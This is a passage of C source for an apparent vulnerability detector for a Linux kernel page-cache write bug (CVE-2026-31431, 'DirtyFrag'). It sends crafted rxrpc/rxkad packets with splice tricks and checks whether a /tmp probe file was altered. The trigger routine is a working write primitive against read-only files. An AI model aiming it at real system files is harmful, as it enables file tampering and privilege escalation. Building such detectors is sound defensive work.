			.sin_addr.s_addr=htonl(0x7F000001) };
		if (sendto(udp_srv, &c, sizeof(c), 0,
					(struct sockaddr*)&to, sizeof(to)) < 0) {
			close(rxsk_cli); close(udp_srv);
			syscall(SYS_keyctl, KEYCTL_INVALIDATE, key); return -1;
		}
	}

	for (int i = 0; i < 4; i++) {
		struct sockaddr_in src;
		if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0) break;
	}

	uint8_t csum_iv[8] = {0};
	if (compute_csum_iv(epoch, cid, 2, RXKAD_SESSION_KEY, csum_iv) < 0) {
		close(rxsk_cli); close(udp_srv);
		syscall(SYS_keyctl, KEYCTL_INVALIDATE, key); return -1;
	}
	uint16_t cksum_h = 0;
	if (compute_cksum(cid, callN, 1, RXKAD_SESSION_KEY, csum_iv, &cksum_h) < 0) {
		close(rxsk_cli); close(udp_srv);
		syscall(SYS_keyctl, KEYCTL_INVALIDATE, key); return -1;
	}

	struct rxrpc_wire_header mal = {0};
	mal.epoch = htonl(epoch);
	mal.cid = htonl(cid);
	mal.callNumber = htonl(callN);
	mal.seq = htonl(1);
	mal.serial = htonl(0x42000);
	mal.type = RXRPC_PACKET_TYPE_DATA;
	mal.flags = RXRPC_LAST_PACKET;
	mal.securityIndex = 2;
	mal.cksum = htons(cksum_h);
	mal.serviceId = htons(svc_in);

	struct sockaddr_in dst = { .sin_family=AF_INET,
		.sin_port=htons(cli_port),
		.sin_addr.s_addr=htonl(0x7F000001) };
	if (connect(udp_srv, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
		close(rxsk_cli); close(udp_srv);
		syscall(SYS_keyctl, KEYCTL_INVALIDATE, key); return -1;
	}

	int p[2];
	if (pipe(p) < 0) {
		close(rxsk_cli); close(udp_srv);
		syscall(SYS_keyctl, KEYCTL_INVALIDATE, key); return -1;
	}
	{
		struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
		if (vmsplice(p[1], &viv, 1, 0) < 0) goto fail;
	}
	{
		loff_t off = splice_off;
		if (splice(target_fd, &off, p[1], NULL, splice_len, SPLICE_F_NONBLOCK) < 0)
			goto fail;
	}
	if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0)
		goto fail;
	close(p[0]); close(p[1]);

	int fl = fcntl(rxsk_cli, F_GETFL);
	fcntl(rxsk_cli, F_SETFL, fl | O_NONBLOCK);
	for (int round = 0; round < 5; round++) {
		char rb[2048];
		struct sockaddr_rxrpc srx;
		char ccb[256];
		struct msghdr m = {0};
		struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
		m.msg_name = &srx; m.msg_namelen = sizeof(srx);
		m.msg_iov = &iv;  m.msg_iovlen = 1;
		m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
		ssize_t r = recvmsg(rxsk_cli, &m, 0);
		if (r > 0) break;
		if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(20000);
		else break;
	}
	fcntl(rxsk_cli, F_SETFL, fl);

	close(rxsk_cli); close(udp_srv);
	syscall(SYS_keyctl, KEYCTL_INVALIDATE, key);
	return 0;

fail:
	close(p[0]); close(p[1]);
	close(rxsk_cli); close(udp_srv);
	syscall(SYS_keyctl, KEYCTL_INVALIDATE, key);
	return -1;
}

static verdict_t probe_rxrpc(const char *path)
{
	/* Quick reachability probe: does the kernel know AF_RXRPC?  If not,
	 * the rxrpc primitive is unreachable (module blocked / not built). */
	int test_rxsk = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (test_rxsk < 0) {
		if (errno == EAFNOSUPPORT || errno == EPROTONOSUPPORT) {
			LOG("rxrpc: AF_RXRPC unavailable (%s) — surface unreachable",
					strerror(errno));
			return V_UNREACHABLE;
		}
		LOG("rxrpc: AF_RXRPC socket failed (%s) — inconclusive",
				strerror(errno));
		return V_INCONCLUSIVE;
	}
	close(test_rxsk);

	int test_alg = alg_open_pcbc_fcrypt(RXKAD_SESSION_KEY);
	if (test_alg < 0) {
		LOG("rxrpc: pcbc(fcrypt) AF_ALG unavailable — surface unreachable");
		return V_UNREACHABLE;
	}
	close(test_alg);

	int target_fd = open(path, O_RDONLY);
	if (target_fd < 0) {
		LOG("rxrpc: open probe file failed — inconclusive");
		return V_INCONCLUSIVE;
	}

	const off_t splice_off = 0;
	const size_t splice_len = 8;
	int rc = rxrpc_one_trigger(target_fd, splice_off, splice_len,
			7777, 7778, 1234, "probe_key_0");
	close(target_fd);
	if (rc < 0) {
		LOG("rxrpc: trigger setup failed — inconclusive");
		return V_INCONCLUSIVE;
	}

	uint8_t got[8];
	if (reread(path, splice_off, got, sizeof(got)) < 0) {
		LOG("rxrpc: reread failed — inconclusive");
		return V_INCONCLUSIVE;
	}
	LOG("rxrpc: bytes at off 0 = %02x %02x %02x %02x %02x %02x %02x %02x",
			got[0], got[1], got[2], got[3],
			got[4], got[5], got[6], got[7]);

	for (size_t i = 0; i < sizeof(got); i++)
		if (got[i] != SENTINEL_BYTE)
			return V_VULNERABLE;
	return V_NOT_VULNERABLE;
}

/* ===================================================================
 * orchestration
 * =================================================================== */

struct probe_result {
	verdict_t xfrm;
	verdict_t rxrpc;
};

static int run_probes_in_child(struct probe_result *out)
{
	int pfd[2];
	if (pipe(pfd) < 0) { perror("pipe"); return -1; }
	pid_t pid = fork();
	if (pid < 0) { perror("fork"); close(pfd[0]); close(pfd[1]); return -1; }
	if (pid == 0) {
		close(pfd[0]);
		struct probe_result r = { V_INCONCLUSIVE, V_INCONCLUSIVE };
		ssize_t wn;
		if (unshare_userns_netns() < 0) {
			wn = write(pfd[1], &r, sizeof(r)); (void)wn;
			_exit(2);
		}
		usleep(100 * 1000);

		char path[64] = {0};
		if (make_probe_file(path, sizeof(path)) < 0) {
			wn = write(pfd[1], &r, sizeof(r)); (void)wn;
			_exit(2);
		}

		if (g_run_xfrm)  r.xfrm  = probe_xfrm(path);
		if (g_run_rxrpc) r.rxrpc = probe_rxrpc(path);

		drop_and_unlink(path);
		wn = write(pfd[1], &r, sizeof(r)); (void)wn;
		_exit(0);
	}
	close(pfd[1]);
	struct probe_result r = { V_INCONCLUSIVE, V_INCONCLUSIVE };
	ssize_t n = read(pfd[0], &r, sizeof(r));
	close(pfd[0]);
	int wstatus = 0;
	waitpid(pid, &wstatus, 0);
	*out = r;
	return (n == (ssize_t)sizeof(r)) ? 0 : -1;
}

static void usage(const char *argv0)
{
	fprintf(stderr,
		"Usage: %s [-v] [--xfrm-only] [--rxrpc-only] [--no-cleanup]\n"
		"\n"
		"  Non-exploitative detector for CVE-2026-31431 (DirtyFrag).\n"
		"  Probes both the XFRM/espinudp and rxrpc/rxkad page-cache\n"
		"  write primitives against a tempfile under /tmp.\n"
		"\n"
		"  -v               verbose progress on stderr\n"
		"  --xfrm-only      run only the XFRM/espinudp probe\n"
		"  --rxrpc-only     run only the rxrpc/rxkad probe\n"
		"  --no-cleanup     leave the tempfile in place after running\n"
		"\n"
		"  Exit codes:\n"
		"    0   NOT_VULNERABLE\n"
		"    1   VULNERABLE\n"
		"    2   ERROR / INCONCLUSIVE\n",
		argv0);
}

int main(int argc, char **argv)
{
	int saw_only = 0;
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
			g_verbose = 1;
		else if (!strcmp(argv[i], "--xfrm-only")) {
			g_run_xfrm = 1; g_run_rxrpc = 0; saw_only = 1;
		} else if (!strcmp(argv[i], "--rxrpc-only")) {
			g_run_xfrm = 0; g_run_rxrpc = 1; saw_only = 1;
		} else if (!strcmp(argv[i], "--no-cleanup")) {
			g_no_cleanup = 1;
		} else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
			usage(argv[0]); return 0;
		} else {
			fprintf(stderr, "unknown argument: %s\n", argv[i]);
			usage(argv[0]); return 2;
		}
	}
	(void)saw_only;

	struct probe_result r;
	if (run_probes_in_child(&r) < 0) {
		fprintf(stderr, "fatal: probe child setup failed\n");
		return 2;
	}

	printf("=== DirtyFrag (CVE-2026-31431) detector ===\n");
	if (g_run_xfrm)
		printf("  XFRM/espinudp ESN seq_hi write : %s\n", verdict_str(r.xfrm));
	else
		printf("  XFRM/espinudp ESN seq_hi write : SKIPPED\n");
	if (g_run_rxrpc)
		printf("  rxrpc/rxkad in-place decrypt   : %s\n", verdict_str(r.rxrpc));
	else
		printf("  rxrpc/rxkad in-place decrypt   : SKIPPED\n");

	bool any_vuln =
		(g_run_xfrm  && r.xfrm  == V_VULNERABLE) ||
		(g_run_rxrpc && r.rxrpc == V_VULNERABLE);
	bool any_inc =
		(g_run_xfrm  && r.xfrm  == V_INCONCLUSIVE) ||
		(g_run_rxrpc && r.rxrpc == V_INCONCLUSIVE);
	bool any_reachable =
		(g_run_xfrm  && (r.xfrm  == V_NOT_VULNERABLE || r.xfrm  == V_VULNERABLE)) ||
		(g_run_rxrpc && (r.rxrpc == V_NOT_VULNERABLE || r.rxrpc == V_VULNERABLE));

	if (any_vuln) {
		printf("Result: VULNERABLE — kernel mutated probe-file page cache.\n");
		return 1;
	}
	if (any_inc) {
		printf("Result: INCONCLUSIVE — at least one probe could not run end-to-end "
				"(re-run with -v).\n");
		return 2;
	}
	if (!any_reachable) {
		printf("Result: NOT_VULNERABLE — vulnerable primitive surface is not "
				"reachable on this host (modules blocked / feature absent).\n");
		return 0;
	}
	printf("Result: NOT_VULNERABLE — kernel did not mutate probe-file page cache.\n");
	return 0;
}
